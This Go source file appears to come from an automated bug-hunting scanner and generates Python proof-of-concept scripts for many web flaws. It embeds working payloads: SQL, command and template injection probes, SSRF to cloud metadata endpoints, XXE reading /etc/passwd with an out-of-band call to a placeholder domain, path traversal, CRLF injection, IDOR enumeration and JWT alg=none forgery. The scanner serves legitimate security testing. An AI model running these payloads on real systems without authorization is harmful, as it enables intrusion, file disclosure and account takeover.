package scanner

import (
	"fmt"
	"net/url"
	"strings"

	"auto-bughunter/backend/internal/model"
)

// GeneratePythonPoC generates a self-contained Python 3 script (using the
// standard `urllib` / `http.client` stack only — no third-party packages)
// that reproduces the finding end-to-end, including auth bootstrap.
//
// Supported categories:
//   - sqli / sql-injection
//   - xss / reflected-xss / stored-xss / dom-xss
//   - idor / bola
//   - ssrf
//   - open-redirect
//   - race-condition
//   - command injection
//   - ssti / template injection
//   - xxe / xml external entity
//   - path traversal / lfi
//   - prototype pollution
//   - crlf injection / http response splitting
//   - cors misconfiguration
//   - jwt (algorithm confusion / none / weak secret)
//
// Returns an empty string when no template exists for the finding category.
func GeneratePythonPoC(f model.Finding, auth model.ScanAuthProfile) string {
	cat := strings.ToLower(f.Category)
	id := strings.ToLower(f.ID)

	switch {
	case strings.Contains(cat, "sqli") || strings.Contains(id, "sqli") || strings.Contains(id, "sql-injection"):
		return buildSQLiPoC(f, auth)
	case strings.Contains(cat, "xss") || strings.Contains(id, "xss"):
		return buildXSSPoC(f, auth)
	case strings.Contains(cat, "idor") || strings.Contains(cat, "bola") || strings.Contains(id, "idor"):
		return buildIDORPoC(f, auth)
	case strings.Contains(cat, "ssrf") || strings.Contains(id, "ssrf"):
		return buildSSRFPoC(f, auth)
	case strings.Contains(cat, "redirect") || strings.Contains(id, "redirect"):
		return buildRedirectPoC(f, auth)
	case strings.Contains(cat, "race") || strings.Contains(id, "race"):
		return buildRacePoC(f, auth)
	case strings.Contains(cat, "command") || strings.Contains(id, "command-injection") || strings.Contains(id, "cmdi"):
		return buildCommandInjectionPoC(f, auth)
	case strings.Contains(cat, "ssti") || strings.Contains(cat, "template") || strings.Contains(id, "ssti"):
		return buildSSTIPoC(f, auth)
	case strings.Contains(cat, "xxe") || strings.Contains(id, "xxe") || strings.Contains(cat, "xml external"):
		return buildXXEPoC(f, auth)
	case strings.Contains(cat, "path_traversal") || strings.Contains(cat, "path traversal") ||
		strings.Contains(cat, "directory traversal") || strings.Contains(cat, "lfi") ||
		strings.Contains(id, "path-traversal") || strings.Contains(id, "lfi"):
		return buildPathTraversalPoC(f, auth)
	case strings.Contains(cat, "prototype") || strings.Contains(id, "prototype-pollution"):
		return buildPrototypePollutionPoC(f, auth)
	case strings.Contains(cat, "crlf") || strings.Contains(id, "crlf") || strings.Contains(cat, "response splitting"):
		return buildCRLFPoC(f, auth)
	case strings.Contains(cat, "cors") || strings.Contains(id, "cors"):
		return buildCORSPoC(f, auth)
	case strings.Contains(cat, "jwt") || strings.Contains(id, "jwt"):
		return buildJWTPoC(f, auth)
	}
	return ""
}

// buildPoCHeader renders the common Python 3 preamble including auth bootstrap.
func buildPoCHeader(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString("#!/usr/bin/env python3\n")
	sb.WriteString("# Auto-generated PoC script — for authorized testing only\n")
	sb.WriteString(fmt.Sprintf("# Finding: %s\n", f.Title))
	sb.WriteString(fmt.Sprintf("# Category: %s | Severity: %s | CWE: %s\n", f.Category, f.Severity, f.CWE))
	sb.WriteString("import urllib.request, urllib.parse, http.cookiejar, json, sys, time\n\n")

	sb.WriteString("# --- Auth bootstrap ---\n")
	sb.WriteString("opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))\n")

	// Add static auth headers if present.
	for k, v := range auth.Headers {
		if isSensitiveHeaderName(k) {
			sb.WriteString(fmt.Sprintf("opener.addheaders.append((%q, %q))  # REDACTED — fill in before running\n", k, "<REDACTED>"))
		} else {
			sb.WriteString(fmt.Sprintf("opener.addheaders.append((%q, %q))\n", k, v))
		}
	}
	if auth.UserAgent != "" {
		sb.WriteString(fmt.Sprintf("opener.addheaders.append(('User-Agent', %q))\n", auth.UserAgent))
	}
	if auth.BasicAuthUsername != "" {
		sb.WriteString("import base64\n")
		sb.WriteString(fmt.Sprintf(
			"opener.addheaders.append(('Authorization', 'Basic ' + base64.b64encode((%q + ':' + '<REDACTED_PASSWORD>').encode()).decode()))\n",
			auth.BasicAuthUsername,
		))
	}
	if auth.LoginURL != "" {
		sb.WriteString(fmt.Sprintf("\n# --- Login step ---\nlogin_data = urllib.parse.urlencode({'username': %q, 'password': '<REDACTED_PASSWORD>'}).encode()\n", auth.Username))
		sb.WriteString(fmt.Sprintf("opener.open(%q, login_data)\n", auth.LoginURL))
	}
	sb.WriteString("\n")
	return sb.String()
}

func buildSQLiPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))

	targetURL := safeURL(f.AffectedURL, f.Sources)
	param := strings.TrimSpace(f.AffectedParameter)
	if param == "" {
		param = "id"
	}

	sb.WriteString("# --- SQL injection probe ---\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n", targetURL))
	sb.WriteString(fmt.Sprintf("PARAM  = %q\n\n", param))
	sb.WriteString("# Standard boolean-based blind payload\n")
	sb.WriteString("PAYLOADS = [\n")
	sb.WriteString("    \"' OR '1'='1\",\n")
	sb.WriteString("    \"' OR 1=1 -- -\",\n")
	sb.WriteString("    \"1 AND SLEEP(3) -- -\",\n")
	sb.WriteString("]\n\n")
	sb.WriteString("for payload in PAYLOADS:\n")
	sb.WriteString("    params = urllib.parse.urlencode({PARAM: payload})\n")
	sb.WriteString("    url = TARGET + '?' + params\n")
	sb.WriteString("    start = time.time()\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = opener.open(url)\n")
	sb.WriteString("        body = resp.read().decode('utf-8', errors='replace')\n")
	sb.WriteString("        elapsed = time.time() - start\n")
	sb.WriteString("        print(f'[+] payload={payload!r} status={resp.status} elapsed={elapsed:.2f}s body_len={len(body)}')\n")
	sb.WriteString("        if elapsed > 2.5:\n")
	sb.WriteString("            print('[!] Time-based SQLi confirmed — server delayed response')\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        print(f'[-] Error: {e}')\n")
	return sb.String()
}

func buildXSSPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))

	targetURL := safeURL(f.AffectedURL, f.Sources)
	param := strings.TrimSpace(f.AffectedParameter)
	if param == "" {
		param = "q"
	}

	sb.WriteString("# --- Reflected XSS probe ---\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n", targetURL))
	sb.WriteString(fmt.Sprintf("PARAM  = %q\n\n", param))
	sb.WriteString("MARKER = '\"><svg/onload=document.title=`abh_xss_confirmed`><!--abh_xss-->'\n\n")
	sb.WriteString("params = urllib.parse.urlencode({PARAM: MARKER})\n")
	sb.WriteString("url = TARGET + '?' + params\n")
	sb.WriteString("try:\n")
	sb.WriteString("    resp = opener.open(url)\n")
	sb.WriteString("    body = resp.read().decode('utf-8', errors='replace')\n")
	sb.WriteString("    if MARKER in body:\n")
	sb.WriteString("        print('[!] XSS confirmed — marker reflected unescaped in response')\n")
	sb.WriteString("    else:\n")
	sb.WriteString("        print('[~] Marker not found in response — may be server-side filtered')\n")
	sb.WriteString("except Exception as e:\n")
	sb.WriteString("    print(f'[-] Error: {e}')\n")
	return sb.String()
}

func buildIDORPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))

	targetURL := safeURL(f.AffectedURL, f.Sources)

	sb.WriteString("# --- IDOR / BOLA probe ---\n")
	sb.WriteString(fmt.Sprintf("TEMPLATE_URL = %q  # Replace {{id}} with a target object ID\n\n", targetURL))
	sb.WriteString("# Enumerate a range of sequential IDs — adjust range to known value space\n")
	sb.WriteString("for object_id in range(1, 20):\n")
	sb.WriteString("    url = TEMPLATE_URL.replace('{{id}}', str(object_id)).replace('/0', '/' + str(object_id))\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = opener.open(url)\n")
	sb.WriteString("        body = resp.read().decode('utf-8', errors='replace')\n")
	sb.WriteString("        print(f'[+] id={object_id} status={resp.status} body_len={len(body)}')\n")
	sb.WriteString("        if resp.status == 200 and len(body) > 10:\n")
	sb.WriteString("            print(f'  [!] Possible cross-account access at id={object_id}')\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        print(f'[-] id={object_id} error={e}')\n")
	return sb.String()
}

func buildSSRFPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))

	targetURL := safeURL(f.AffectedURL, f.Sources)
	param := strings.TrimSpace(f.AffectedParameter)
	if param == "" {
		param = "url"
	}

	sb.WriteString("# --- SSRF probe ---\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n", targetURL))
	sb.WriteString(fmt.Sprintf("PARAM  = %q\n\n", param))
	sb.WriteString("# Replace the OAST URL below with your OOB callback domain (Burp Collaborator / interactsh)\n")
	sb.WriteString("OAST_URL = 'http://your-oast-domain.example.com/ssrf-probe'\n\n")
	sb.WriteString("PAYLOADS = [\n")
	sb.WriteString("    OAST_URL,\n")
	sb.WriteString("    'http://169.254.169.254/latest/meta-data/',\n")
	sb.WriteString("    'http://metadata.google.internal/computeMetadata/v1/',\n")
	sb.WriteString("]\n\n")
	sb.WriteString("for payload in PAYLOADS:\n")
	sb.WriteString("    params = urllib.parse.urlencode({PARAM: payload})\n")
	sb.WriteString("    url = TARGET + '?' + params\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = opener.open(url)\n")
	sb.WriteString("        body = resp.read().decode('utf-8', errors='replace')\n")
	sb.WriteString("        print(f'[+] payload={payload!r} status={resp.status} body_snippet={body[:200]!r}')\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        print(f'[-] payload={payload!r} error={e}')\n")
	sb.WriteString("print('[i] Also check your OAST endpoint for an OOB DNS/HTTP callback')\n")
	return sb.String()
}

func buildRedirectPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))

	targetURL := safeURL(f.AffectedURL, f.Sources)
	param := strings.TrimSpace(f.AffectedParameter)
	if param == "" {
		param = "next"
	}

	sb.WriteString("# --- Open redirect probe ---\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n", targetURL))
	sb.WriteString(fmt.Sprintf("PARAM  = %q\n\n", param))
	sb.WriteString("PAYLOADS = [\n")
	sb.WriteString("    'https://attacker.example.com',\n")
	sb.WriteString("    '//attacker.example.com',\n")
	sb.WriteString("    '/\\/attacker.example.com',\n")
	sb.WriteString("]\n\n")
	sb.WriteString("# Disable auto-redirect so we can inspect the 302 Location header\n")
	sb.WriteString("class NoRedirect(urllib.request.HTTPRedirectHandler):\n")
	sb.WriteString("    def redirect_request(self, *args, **kwargs):\n")
	sb.WriteString("        return None\n\n")
	sb.WriteString("no_redir_opener = urllib.request.build_opener(NoRedirect())\n")
	sb.WriteString("for payload in PAYLOADS:\n")
	sb.WriteString("    params = urllib.parse.urlencode({PARAM: payload})\n")
	sb.WriteString("    url = TARGET + '?' + params\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = no_redir_opener.open(url)\n")
	sb.WriteString("        loc = resp.getheader('Location', '')\n")
	sb.WriteString("        print(f'[+] payload={payload!r} status={resp.status} location={loc!r}')\n")
	sb.WriteString("        if 'attacker' in loc:\n")
	sb.WriteString("            print('[!] Open redirect confirmed — Location points to attacker domain')\n")
	sb.WriteString("    except urllib.error.HTTPError as e:\n")
	sb.WriteString("        loc = e.headers.get('Location', '')\n")
	sb.WriteString("        print(f'[+] payload={payload!r} status={e.code} location={loc!r}')\n")
	sb.WriteString("        if 'attacker' in loc:\n")
	sb.WriteString("            print('[!] Open redirect confirmed')\n")
	return sb.String()
}

func buildRacePoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))

	targetURL := safeURL(f.AffectedURL, f.Sources)

	sb.WriteString("# --- Race condition / TOCTOU PoC ---\n")
	sb.WriteString("import threading\n\n")
	sb.WriteString(fmt.Sprintf("TARGET  = %q\n\n", targetURL))
	sb.WriteString("WORKERS = 8\n")
	sb.WriteString("results = []\n")
	sb.WriteString("lock = threading.Lock()\n\n")
	sb.WriteString("def fire():\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        req = urllib.request.Request(TARGET, data=b'{}', method='POST')\n")
	sb.WriteString("        req.add_header('Content-Type', 'application/json')\n")
	sb.WriteString("        resp = opener.open(req)\n")
	sb.WriteString("        with lock:\n")
	sb.WriteString("            results.append(resp.status)\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        with lock:\n")
	sb.WriteString("            results.append(str(e))\n\n")
	sb.WriteString("threads = [threading.Thread(target=fire) for _ in range(WORKERS)]\n")
	sb.WriteString("# Synchronise all threads at the same barrier\n")
	sb.WriteString("barrier = threading.Barrier(WORKERS)\n")
	sb.WriteString("def fire_sync():\n")
	sb.WriteString("    barrier.wait()\n")
	sb.WriteString("    fire()\n\n")
	sb.WriteString("threads = [threading.Thread(target=fire_sync) for _ in range(WORKERS)]\n")
	sb.WriteString("for t in threads:\n")
	sb.WriteString("    t.start()\n")
	sb.WriteString("for t in threads:\n")
	sb.WriteString("    t.join(timeout=15)\n\n")
	sb.WriteString("successes = sum(1 for r in results if isinstance(r, int) and 200 <= r < 300)\n")
	sb.WriteString("print(f'[+] Results: {results}')\n")
	sb.WriteString("print(f'[+] 2xx successes: {successes}/{WORKERS}')\n")
	sb.WriteString("if successes >= 2:\n")
	sb.WriteString("    print('[!] Race condition confirmed — multiple concurrent requests succeeded')\n")
	return sb.String()
}

// safeURL returns f.AffectedURL if set, otherwise a placeholder.
func safeURL(affectedURL string, sources []string) string {
	u := strings.TrimSpace(affectedURL)
	if u != "" {
		// Keep only scheme+host+path; strip injected payloads from query.
		if parsed, err := url.Parse(u); err == nil {
			parsed.RawQuery = ""
			return parsed.String()
		}
	}
	return "https://target.example.com/api/endpoint"
}

// AttachPythonPoC enriches a Finding with a Python PoC script in the EvidenceFields
// and PoC field (if not already set). It is a no-op when no template is available
// for the finding's category.
func AttachPythonPoC(f model.Finding, auth model.ScanAuthProfile) model.Finding {
	poc := GeneratePythonPoC(f, auth)
	if poc == "" {
		return f
	}
	if f.EvidenceFields == nil {
		f.EvidenceFields = map[string]string{}
	}
	f.EvidenceFields["pythonPoC"] = poc
	if f.PoC == "" {
		f.PoC = poc
	}
	return f
}

// -----------------------------------------------------------------------------
// New PoC builders — command injection, SSTI, XXE, path traversal,
// prototype pollution, CRLF, CORS, JWT. All use the shared preamble.
// -----------------------------------------------------------------------------

func buildCommandInjectionPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))
	targetURL := safeURL(f.AffectedURL, f.Sources)
	param := strings.TrimSpace(f.AffectedParameter)
	if param == "" {
		param = "cmd"
	}
	sb.WriteString("# --- Command injection probe ---\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n", targetURL))
	sb.WriteString(fmt.Sprintf("PARAM  = %q\n\n", param))
	sb.WriteString("# Time-based detection: sleep 5 seconds. Change 'sleep 5' to 'timeout 5' for Windows.\n")
	sb.WriteString("PAYLOADS = [\n")
	sb.WriteString("    '; sleep 5',\n")
	sb.WriteString("    '| sleep 5',\n")
	sb.WriteString("    '`sleep 5`',\n")
	sb.WriteString("    '$(sleep 5)',\n")
	sb.WriteString("    '&& sleep 5',\n")
	sb.WriteString("]\n\n")
	sb.WriteString("for payload in PAYLOADS:\n")
	sb.WriteString("    params = urllib.parse.urlencode({PARAM: 'x' + payload})\n")
	sb.WriteString("    url = TARGET + '?' + params\n")
	sb.WriteString("    start = time.time()\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = opener.open(url, timeout=15)\n")
	sb.WriteString("        elapsed = time.time() - start\n")
	sb.WriteString("        print(f'[+] payload={payload!r} status={resp.status} elapsed={elapsed:.2f}s')\n")
	sb.WriteString("        if elapsed > 4.5:\n")
	sb.WriteString("            print('[!] Command injection confirmed — server delayed response')\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        print(f'[-] Error: {e}')\n")
	return sb.String()
}

func buildSSTIPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))
	targetURL := safeURL(f.AffectedURL, f.Sources)
	param := strings.TrimSpace(f.AffectedParameter)
	if param == "" {
		param = "name"
	}
	sb.WriteString("# --- Server-Side Template Injection probe ---\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n", targetURL))
	sb.WriteString(fmt.Sprintf("PARAM  = %q\n\n", param))
	sb.WriteString("# Payloads target common template engines: Jinja2, Twig, Freemarker,\n")
	sb.WriteString("# Velocity, ERB, Pebble. Each computes 7*7=49 in a way that returns\n")
	sb.WriteString("# the literal string \"49\" if the payload is evaluated server-side.\n")
	sb.WriteString("PAYLOADS = [\n")
	sb.WriteString("    ('jinja2', '{{7*7}}'),\n")
	sb.WriteString("    ('erb',    '<%= 7*7 %>'),\n")
	sb.WriteString("    ('twig',   '{{7*7}}'),\n")
	sb.WriteString("    ('velocity','#set($x=7*7)$x'),\n")
	sb.WriteString("    ('freemarker','${7*7}'),\n")
	sb.WriteString("    ('smarty', '{$smarty.version}'),\n")
	sb.WriteString("]\n\n")
	sb.WriteString("for engine, payload in PAYLOADS:\n")
	sb.WriteString("    params = urllib.parse.urlencode({PARAM: payload})\n")
	sb.WriteString("    url = TARGET + '?' + params\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = opener.open(url)\n")
	sb.WriteString("        body = resp.read().decode('utf-8', errors='replace')\n")
	sb.WriteString("        if '49' in body and payload not in body:\n")
	sb.WriteString("            print(f'[!] SSTI confirmed — engine={engine} evaluated 7*7=49')\n")
	sb.WriteString("        else:\n")
	sb.WriteString("            print(f'[+] engine={engine} payload={payload!r} status={resp.status}')\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        print(f'[-] engine={engine} error={e}')\n")
	return sb.String()
}

func buildXXEPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))
	targetURL := safeURL(f.AffectedURL, f.Sources)
	sb.WriteString("# --- XML External Entity (XXE) probe ---\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n\n", targetURL))
	sb.WriteString("# Replace with your OAST/collaborator domain for out-of-band verification.\n")
	sb.WriteString("OAST_DOMAIN = 'your-oast-domain.example.com'\n\n")
	sb.WriteString("PAYLOADS = [\n")
	sb.WriteString("    ('file', '''<?xml version=\"1.0\"?>\\n<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>\\n<r>&x;</r>'''),\n")
	sb.WriteString("    ('oob',  f'''<?xml version=\"1.0\"?>\\n<!DOCTYPE r [<!ENTITY %% x SYSTEM \"http://{OAST_DOMAIN}/xxe-probe\"> %%x;]>\\n<r/>'''),\n")
	sb.WriteString("]\n\n")
	sb.WriteString("for label, payload in PAYLOADS:\n")
	sb.WriteString("    req = urllib.request.Request(TARGET, data=payload.encode(), method='POST')\n")
	sb.WriteString("    req.add_header('Content-Type', 'application/xml')\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = opener.open(req, timeout=15)\n")
	sb.WriteString("        body = resp.read().decode('utf-8', errors='replace')\n")
	sb.WriteString("        print(f'[+] variant={label} status={resp.status} body_snippet={body[:200]!r}')\n")
	sb.WriteString("        if 'root:' in body or 'daemon:' in body:\n")
	sb.WriteString("            print('[!] XXE confirmed — /etc/passwd content returned')\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        print(f'[-] variant={label} error={e}')\n")
	sb.WriteString("print(f'[i] Also check {OAST_DOMAIN} for an out-of-band DNS/HTTP callback')\n")
	return sb.String()
}

func buildPathTraversalPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))
	targetURL := safeURL(f.AffectedURL, f.Sources)
	param := strings.TrimSpace(f.AffectedParameter)
	if param == "" {
		param = "file"
	}
	sb.WriteString("# --- Path traversal / LFI probe ---\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n", targetURL))
	sb.WriteString(fmt.Sprintf("PARAM  = %q\n\n", param))
	sb.WriteString("PAYLOADS = [\n")
	sb.WriteString("    '../../../../etc/passwd',\n")
	sb.WriteString("    '..%2F..%2F..%2F..%2Fetc%2Fpasswd',\n")
	sb.WriteString("    '....//....//....//etc/passwd',\n")
	sb.WriteString("    '/etc/passwd',\n")
	sb.WriteString("    '..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini',\n")
	sb.WriteString("]\n\n")
	sb.WriteString("for payload in PAYLOADS:\n")
	sb.WriteString("    params = urllib.parse.urlencode({PARAM: payload})\n")
	sb.WriteString("    url = TARGET + '?' + params\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = opener.open(url)\n")
	sb.WriteString("        body = resp.read().decode('utf-8', errors='replace')\n")
	sb.WriteString("        if 'root:' in body or '[extensions]' in body.lower():\n")
	sb.WriteString("            print(f'[!] Path traversal confirmed with payload={payload!r}')\n")
	sb.WriteString("            print(body[:400])\n")
	sb.WriteString("            break\n")
	sb.WriteString("        else:\n")
	sb.WriteString("            print(f'[+] payload={payload!r} status={resp.status} body_len={len(body)}')\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        print(f'[-] Error: {e}')\n")
	return sb.String()
}

func buildPrototypePollutionPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))
	targetURL := safeURL(f.AffectedURL, f.Sources)
	sb.WriteString("# --- Client-side prototype pollution probe ---\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n\n", targetURL))
	sb.WriteString("# Query-string pollution vectors — check the returned page in a browser\n")
	sb.WriteString("# devtools console for `Object.prototype.polluted === 'abh_pp'`.\n")
	sb.WriteString("PAYLOADS = [\n")
	sb.WriteString("    '?__proto__[polluted]=abh_pp',\n")
	sb.WriteString("    '?constructor[prototype][polluted]=abh_pp',\n")
	sb.WriteString("    '#__proto__[polluted]=abh_pp',\n")
	sb.WriteString("]\n\n")
	sb.WriteString("for payload in PAYLOADS:\n")
	sb.WriteString("    url = TARGET + payload\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = opener.open(url)\n")
	sb.WriteString("        body = resp.read().decode('utf-8', errors='replace')\n")
	sb.WriteString("        print(f'[+] payload={payload!r} status={resp.status} body_len={len(body)}')\n")
	sb.WriteString("        print('    [i] Open this URL in a browser and evaluate Object.prototype.polluted in devtools.')\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        print(f'[-] Error: {e}')\n")
	return sb.String()
}

func buildCRLFPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))
	targetURL := safeURL(f.AffectedURL, f.Sources)
	param := strings.TrimSpace(f.AffectedParameter)
	if param == "" {
		param = "next"
	}
	sb.WriteString("# --- CRLF injection / HTTP response splitting probe ---\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n", targetURL))
	sb.WriteString(fmt.Sprintf("PARAM  = %q\n\n", param))
	sb.WriteString("MARKER = 'abh_crlf_marker'\n")
	sb.WriteString("PAYLOADS = [\n")
	sb.WriteString("    f'x%0d%0aSet-Cookie:%20{MARKER}=1',\n")
	sb.WriteString("    f'x%0d%0aX-Injected-Header:%20{MARKER}',\n")
	sb.WriteString("    f'x\\r\\nSet-Cookie: {MARKER}=1',\n")
	sb.WriteString("]\n\n")
	sb.WriteString("for payload in PAYLOADS:\n")
	sb.WriteString("    url = TARGET + '?' + PARAM + '=' + payload\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = opener.open(url)\n")
	sb.WriteString("        headers = dict(resp.getheaders())\n")
	sb.WriteString("        cookie = headers.get('Set-Cookie', '')\n")
	sb.WriteString("        injected = headers.get('X-Injected-Header', '')\n")
	sb.WriteString("        print(f'[+] payload={payload!r} status={resp.status} injected={injected!r} cookie={cookie!r}')\n")
	sb.WriteString("        if MARKER in cookie or MARKER in injected:\n")
	sb.WriteString("            print('[!] CRLF injection confirmed — attacker header was reflected in response')\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        print(f'[-] Error: {e}')\n")
	return sb.String()
}

func buildCORSPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))
	targetURL := safeURL(f.AffectedURL, f.Sources)
	sb.WriteString("# --- CORS misconfiguration probe ---\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n\n", targetURL))
	sb.WriteString("EVIL_ORIGINS = [\n")
	sb.WriteString("    'https://evil.example.com',\n")
	sb.WriteString("    'null',\n")
	sb.WriteString("    'https://target.example.com.evil.example.com',\n")
	sb.WriteString("]\n\n")
	sb.WriteString("for origin in EVIL_ORIGINS:\n")
	sb.WriteString("    req = urllib.request.Request(TARGET, method='GET')\n")
	sb.WriteString("    req.add_header('Origin', origin)\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = opener.open(req)\n")
	sb.WriteString("        acao = resp.getheader('Access-Control-Allow-Origin', '')\n")
	sb.WriteString("        acac = resp.getheader('Access-Control-Allow-Credentials', '')\n")
	sb.WriteString("        print(f'[+] origin={origin!r} status={resp.status} ACAO={acao!r} ACAC={acac!r}')\n")
	sb.WriteString("        if acao == origin and acac.lower() == 'true':\n")
	sb.WriteString("            print('[!] CORS misconfiguration confirmed — origin reflected with credentials=true')\n")
	sb.WriteString("        elif acao == '*' and acac.lower() == 'true':\n")
	sb.WriteString("            print('[!] CORS misconfiguration confirmed — wildcard origin with credentials=true (browsers reject, but noteworthy)')\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        print(f'[-] Error: {e}')\n")
	return sb.String()
}

func buildJWTPoC(f model.Finding, auth model.ScanAuthProfile) string {
	var sb strings.Builder
	sb.WriteString(buildPoCHeader(f, auth))
	targetURL := safeURL(f.AffectedURL, f.Sources)
	sb.WriteString("# --- JWT algorithm-confusion / none-alg probe ---\n")
	sb.WriteString("import base64, hmac, hashlib\n\n")
	sb.WriteString(fmt.Sprintf("TARGET = %q\n\n", targetURL))
	sb.WriteString("# Replace with a captured JWT from your test session.\n")
	sb.WriteString("ORIGINAL_JWT = '<paste-jwt-here>'\n\n")
	sb.WriteString("def b64url(data):\n")
	sb.WriteString("    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\n\n")
	sb.WriteString("def b64url_dec(s):\n")
	sb.WriteString("    pad = '=' * (-len(s) % 4)\n")
	sb.WriteString("    return base64.urlsafe_b64decode(s + pad)\n\n")
	sb.WriteString("def craft_alg_none(jwt):\n")
	sb.WriteString("    hdr, payload, _ = jwt.split('.')\n")
	sb.WriteString("    new_hdr = b64url(json.dumps({'alg':'none','typ':'JWT'}).encode())\n")
	sb.WriteString("    return f'{new_hdr}.{payload}.'\n\n")
	sb.WriteString("def craft_hs256_from_public_key(jwt, public_key_pem):\n")
	sb.WriteString("    # RS256 → HS256 confusion: sign the token with the server's public key\n")
	sb.WriteString("    # treated as the HMAC secret.\n")
	sb.WriteString("    hdr, payload, _ = jwt.split('.')\n")
	sb.WriteString("    new_hdr = b64url(json.dumps({'alg':'HS256','typ':'JWT'}).encode())\n")
	sb.WriteString("    signing_input = f'{new_hdr}.{payload}'.encode()\n")
	sb.WriteString("    sig = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()\n")
	sb.WriteString("    return f'{new_hdr}.{payload}.{b64url(sig)}'\n\n")
	sb.WriteString("CANDIDATE_TOKENS = [\n")
	sb.WriteString("    ('alg=none',    craft_alg_none(ORIGINAL_JWT) if ORIGINAL_JWT != '<paste-jwt-here>' else ''),\n")
	sb.WriteString("]\n\n")
	sb.WriteString("for label, token in CANDIDATE_TOKENS:\n")
	sb.WriteString("    if not token:\n")
	sb.WriteString("        continue\n")
	sb.WriteString("    req = urllib.request.Request(TARGET)\n")
	sb.WriteString("    req.add_header('Authorization', 'Bearer ' + token)\n")
	sb.WriteString("    try:\n")
	sb.WriteString("        resp = opener.open(req)\n")
	sb.WriteString("        body = resp.read().decode('utf-8', errors='replace')\n")
	sb.WriteString("        print(f'[+] variant={label} status={resp.status} body_snippet={body[:200]!r}')\n")
	sb.WriteString("        if resp.status == 200:\n")
	sb.WriteString("            print(f'[!] JWT verification bypass confirmed — {label} accepted')\n")
	sb.WriteString("    except Exception as e:\n")
	sb.WriteString("        print(f'[-] variant={label} error={e}')\n")
	return sb.String()
}
